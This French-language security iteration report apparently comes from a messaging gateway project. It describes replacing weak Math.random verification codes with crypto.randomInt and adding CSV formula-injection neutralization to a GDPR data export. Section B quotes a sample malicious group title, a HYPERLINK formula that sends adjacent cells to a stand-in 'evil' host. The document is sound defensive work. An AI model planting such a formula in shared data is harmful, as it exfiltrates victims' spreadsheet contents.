# Itération 277 — Durcissement sécurité : codes OOB cryptographiques + neutralisation d'injection CSV

## État actuel

Deux surfaces de sécurité du gateway, jusque-là non gardées, sortaient de la
zone que les leçons du dépôt (présence fail-closed, portes d'émission,
sérialisation de schéma, symétrie X3DH) avaient déjà atteinte.

### A. Codes de vérification hors-bande tirés d'un PRNG faible (CWE-338)

Quatre sites minaient un code numérique à 6 chiffres avec la MÊME ligne, verbatim :

```ts
Math.floor(100000 + Math.random() * 900000).toString();
```

- `services/PhonePasswordResetService.ts` — code SMS de **réinitialisation de mot de passe**
- `services/PhoneTransferService.ts` — code de **transfert de numéro** (donc de compte)
- `services/AuthService.ts` — code de **vérification de téléphone**
- `routes/users/contact-change.ts` — code SMS de **changement d'e-mail / de téléphone**

Chacun SHA-256 le code puis en fait le facteur out-of-band d'une action de
récupération de compte. Le dépôt possède déjà le primitif correct —
`TwoFactorService.generateBackupCode` utilise `crypto.randomInt`. C'était donc
une INCOHÉRENCE, pas une capacité manquante — et une quadruplication (violation
de la source unique de vérité).

### B. Injection de formule CSV dans l'export RGPD (CWE-1236), inter-utilisateurs

`routes/me/export.ts` → `toCsv` n'échappait que la structure (virgule, guillemet,
saut de ligne). Rien pour une cellule commençant par `= + - @`, tabulation ou CR.
Or les lignes exportées portent du texte fixé par d'AUTRES utilisateurs :
`conversationName` (titre de conversation) et `displayName` des autres
participants. Un créateur de groupe malveillant titre son groupe
`=HYPERLINK("https://evil/?"&A1,"open")` ; à l'ouverture de l'export dans
Excel / Sheets / LibreOffice par la victime (ou un agent DPO/support), la formule
s'exécute / exfiltre les cellules voisines.

## Problèmes identifiés

1. `Math.random` est le `xorshift128+` non cryptographique de V8 : l'état interne
   se reconstruit à partir de quelques sorties, rendant les codes prédictibles.
2. La quadruplication empêchait toute correction atomique et invitait la
   cinquième copie.
3. `toCsv` traitait la correction STRUCTURELLE et ignorait la neutralisation
   SÉMANTIQUE (déclencheurs de formule) — angle mort classique OWASP.

## Causes racines

- Le bon primitif existait (`crypto.randomInt`) mais n'avait jamais été factorisé
  en site unique ; chaque flux SMS a recopié la ligne faible.
- `toCsv` a été écrit pour la correction CSV (RFC 4180) sans le modèle de menace
  « le tableur interprète la cellule », qui est un problème de tableur, pas de CSV.

## Impact métier

- A : compromission de flux de récupération de compte — le pire vecteur, car le
  code EST le facteur d'authentification de repli.
- B : exécution de formule / exfiltration chez la victime, avec rayon élargi aux
  postes DPO/support qui ouvrent régulièrement ces exports. Vecteur
  INTER-UTILISATEURS (l'attaquant n'a besoin que d'un titre de groupe partagé).

## Impact technique

Minimal. A : un helper neuf + 4 sites repointés (une ligne chacun) + 1 import.
B : `toCsv` exporté + un test de garde `/^[=+\-@\t\r]/` avant la citation
structurelle existante. Aucune signature publique ni forme de réponse changée.

## Évaluation du risque

- A : NUL sur le comportement — `crypto.randomInt(10^(n-1), 10^n)` préserve
  EXACTEMENT l'espace `[100000, 999999]` de l'ancienne ligne pour n=6 (mêmes
  attentes SMS/UX). Le witness comportemental prouve l'absence de `Math.random`.
- B : NUL sur les cellules bénignes (seul le PREMIER caractère déclenche) ; les
  cellules à formule gagnent un `'` en tête, comportement standard et attendu
  d'un export sûr.

## Améliorations proposées (livrées)

1. `services/gateway/src/utils/verification-code.ts` — `generateNumericCode(length = 6)`
   via `crypto.randomInt`, source unique.
2. Les 4 sites délèguent au helper.
3. `toCsv` neutralise les déclencheurs de formule et est EXPORTÉ pour test direct.

## Bénéfices attendus

- Codes OOB imprévisibles sur les quatre flux de récupération.
- Export RGPD non exploitable comme vecteur d'injection de formule.
- Deux règles ramenées à une source unique ; witnesses de régression posés.

## Complexité d'implémentation

Faible. TDD RED→GREEN, deux suites neuves, quatre fichiers de production
touchés d'une ligne, aucune migration, aucun changement de contrat client.

## Critères de validation

- Suites neuves vertes : `verification-code.test.ts` (7), `data-export-csv-injection.test.ts` (10).
- RED prouvé sur les deux (import manquant / export absent).
- Non-régression : 305 tests des suites auth / password-reset / phone-transfer /
  export verts ; `tsc --noEmit` du gateway à 0 erreur.
- Witness de régression : les quatre sites ne portent plus `Math.random` et
  appellent `generateNumericCode`.

## Suivi / dimensions restantes

- **Réaction TOCTOU** (cap de 5 non atomique, 5 sites) — non atomique count→assert→create.
- **Cache GeoIP non borné** (`cleanGeoCache` jamais planifié).
- **Éviction de la map anti-spam mentions** par ordre d'insertion (devrait être
  par ancienneté d'activité).

Chacun est une issue distincte, à instruire au titre des treize dimensions
(sécurité / mémoire), pas une ligne à empiler ici.
